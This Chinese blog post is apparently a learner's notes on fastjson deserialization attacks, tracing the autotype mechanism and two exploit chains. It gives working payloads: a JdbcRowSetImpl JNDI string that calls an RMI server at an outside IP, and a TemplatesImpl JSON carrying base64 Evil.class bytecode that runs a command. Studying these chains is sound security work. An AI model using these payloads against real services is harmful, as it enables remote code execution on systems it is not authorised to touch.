# 前言

开始学习fastjson，`TemplatesImpl利用链`让我跟的脑子疼，还是太菜了，断点打到后面整个人都是懵的。



# 初认fastjson

Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。

Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。

它关键的方法就是三个：

- 将对象转换成JSON字符串：`JSON.toJSONString`
- 将JSON字符串转换成对象：`JSON.parse`和`JSON.parseObject()`



简单的写个类：

```java
package com.feng.pojo;

public class Student {
    private String name;
    private int age;

    public Student() {
        System.out.println("构造函数");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) throws Exception{
        System.out.println("setAge");
        //Runtime.getRuntime().exec("calc");
        this.age = age;
    }
    public void setTest(int i){
        System.out.println("setTest");
    }
}
```

之所以会有这么个`setTest()`，后面会聊到。



来测试一下对象转JSON字符串：

```java
        Student student = new Student();
        student.setAge(18);
        student.setName("feng");
        System.out.println("====================");
        String jsonString1 = JSON.toJSONString(student);
        System.out.println("====================");
        String jsonString2 = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println(jsonString1);
        System.out.println(jsonString2);
```

```shell
构造函数
setAge
setName
====================
getAge
getName
====================
getAge
getName
{"age":18,"name":"feng"}
{"@type":"com.feng.pojo.Student","age":18,"name":"feng"}
```

可以看到，调用`JSON.toJSONString`会自动调用类的`getter`。

可以发现这个`SerializerFeature.WriteClassName`，设置的话就会加上`@type`，指明类。



再试试JSON字符串转对象：

```java
        String jsonString1 = "{\"age\":18,\"name\":\"feng\"}";
        String jsonString2 = "{\"@type\":\"com.feng.pojo.Student\",\"age\":18,\"name\":\"feng\"}";
        System.out.println(JSON.parse(jsonString1));
        System.out.println("======================");
        System.out.println(JSON.parse(jsonString2));
        System.out.println("======================");
        System.out.println(JSON.parseObject(jsonString1));
        System.out.println("======================");
        System.out.println(JSON.parseObject(jsonString2));
        System.out.println("======================");
```

```shell
{"name":"feng","age":18}
======================
构造函数
setAge
setName
com.feng.pojo.Student@7bb11784
======================
{"name":"feng","age":18}
======================
构造函数
setAge
setName
getAge
getName
{"name":"feng","age":18}
======================
```

可以发现`parseObject`最后得到的还是JSON对象。看一下源码可以知道，`parseObject`其实就是调用一次`parse`，然后转换成`JSONObject`：

```java
    public static JSONObject parseObject(String text) {
        Object obj = parse(text);
        if (obj instanceof JSONObject) {
            return (JSONObject) obj;
        }

        return (JSONObject) JSON.toJSON(obj);
    }
```



还可以发现，如果不带上`@type`指明类名，是没法得到类对象的。

如果指明了类名，使用`parse`的时候，不仅会得到对象，还会调用这个对象的`setter`；使用的是`parseObject`的话，不仅会得到对象且调用`setter`，还会调用`getter`。

这种利用`@type`的机制也叫`autotype`：

> autotype 是 Fastjson 中的一个重要机制，粗略来说就是用于设置能否将 JSON 反序列化成对象。



这种会调用`setter`和`getter`的机制，很容易想到之前`CommonsBeanutils1`文章里的`PropertyUtils.getProperty`，将会调用对应属性的`getter`，而且不是说那种调用，是`get+属性`，调用这种方法。

因此同理我在类中设置了一个`setTest`方法，但是不存在`test`属性。经过测试，如果JSON字符串里有了`test`键，在`parse`的时候也确实会调用这个方法，其实这时候就多少会联想到`TemplatesImpl `的`getOutputProperties`。不过这个之后再谈。



# JdbcRowSetImpl利用链

知道了这些东西，如果`parse`或者`parseObject`的字符串可控的话，是否可以造成攻击呢？

这就引出了fastjson的两种攻击方式。好用的肯定还是这个`JNDI`攻击方式。

关于JNDI注入的相关知识，上一篇已经提到了，就不再多阐述了。

关键就是`JdbcRowSetImpl`类的`setDataSourceName()`方法和`setAutoCommit`方法。看一下这个利用链是怎么攻击的：

```java
    public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }
    }
```

如果`this.conn`为null的话，会进入`this.connect()`：

```java
    private Connection connect() throws SQLException {
        if (this.conn != null) {
            return this.conn;
        } else if (this.getDataSourceName() != null) {
            try {
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```

可以很清楚的看到下面两行，很明显的一个JNDI。想办法得让`this.getDataSourceName()`可控：

```java
    public String getDataSourceName() {
        return dataSource;
    }
```

也就是要控制`dataSource`属性。跟进一下`setDataSourceName()`：

```java
    public void setDataSourceName(String var1) throws SQLException {
        if (this.getDataSourceName() != null) {
            if (!this.getDataSourceName().equals(var1)) {
                super.setDataSourceName(var1);
                this.conn = null;
                this.ps = null;
                this.rs = null;
            }
        } else {
            super.setDataSourceName(var1);
        }
```

```java
    public void setDataSourceName(String name) throws SQLException {

        if (name == null) {
            dataSource = null;
        } else if (name.equals("")) {
           throw new SQLException("DataSource name cannot be empty string");
        } else {
           dataSource = name;
        }

        URL = null;
    }
```

直接设置就好了。构造一波：

```java
{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://121.5.169.223:39654/feng\", \"autoCommit\":true}
```



```java
        String jsonString1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://121.5.169.223:39654/feng\", \"autoCommit\":true}";
        JSON.parse(jsonString1);
```



![image-20210902164012900]([Java安全]fastjson学习(一).assets/image-20210902164012900.png)



# TemplatesImpl利用链

给我看的脑子疼。跟进的太嘛了，也是跟了一遍，很懵，可以自己跟进一遍叭。



总的来说，既然想到利用`TemplatesImpl`，就是调用`getOutputProperties`，但是`parse`不应该只调用`setter`吗？关键就在于这里。打断点跟进一下就会发现，当解析到`_OutputProperties`的时候在这里设置值：

![image-20210902165103184]([Java安全]fastjson学习(一).assets/image-20210902165103184.png)

继续跟进，可以发现在`setValue`里面的第66行得到了这个`getOutputProperties`方法

![image-20210902165400929]([Java安全]fastjson学习(一).assets/image-20210902165400929.png)



并且进入了这里的`if`，调用了这个方法：

![image-20210902165506464]([Java安全]fastjson学习(一).assets/image-20210902165506464.png)



试得`TemplatesImpl`可以利用。接下来就是联想一下反序列化中的`TemplatesImpl`：

```java
        byte[] bytes = Base64.getDecoder().decode("xxx");
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{bytes});
        setFieldValue(templates,"_name","feng");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
```

设置这三个属性，然后调用`getOutputProperties`方法即可。



不过这种方法有很大的局限，就是`private`属性的还原。上面讲fastjson的时候用到的`Student`类的属性都是`private`，也都成功还原了。但是你仔细想想，是因为我加了`setter`啊。`private`属性咋可能会有`setter`？这就导致了，要还原`private属性`的话，需要加上个`Feature.SupportNonPublicField`才可以：

```java
JSON.parse(jsonString, Feature.SupportNonPublicField);
```



给出构造的payload：

```java
        String jsonString = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTEV2aWw7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEABEV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFQANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj\"],\"_name\":\"feng\",\"_tfactory\":{},\"_outputProperties\":{}}";

        JSON.parse(jsonString, Feature.SupportNonPublicField);
```

可以很奇怪的发现，`_bytecodes`那里使用了base64编码，这是取了`Evil.class`然后Base64编码。原因就在于，最后在这里得到`bytes`的时候：

```java
                    } else {
                        val = deserializer.deserialze(this, type, i);
                    }
```

```java
        if (lexer.token() == JSONToken.LITERAL_STRING) {
            byte[] bytes = lexer.bytesValue();
            lexer.nextToken(JSONToken.COMMA);
            return (T) bytes;
        }
```

```java
public byte[] bytesValue() {
    return IOUtils.decodeBase64(text, np + 1, sp);
}
```



对`_bytecode`的值进行了base64解码。可以自己跟一下代码看看。所以需要base64编码。

其实想想这种处理方式是很正确的，因为这种字节数组，很容易有不可见字符，所以加一层base64才行。

![image-20210902171154569]([Java安全]fastjson学习(一).assets/image-20210902171154569.png)



# 后记

fastjson的第一篇文章，暂时学习了两条攻击链，接下来就是学习不同版本的限制以及绕过。

# 参考链接

https://xz.aliyun.com/t/8979

https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/

https://www.freebuf.com/vuls/228099.html

http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/

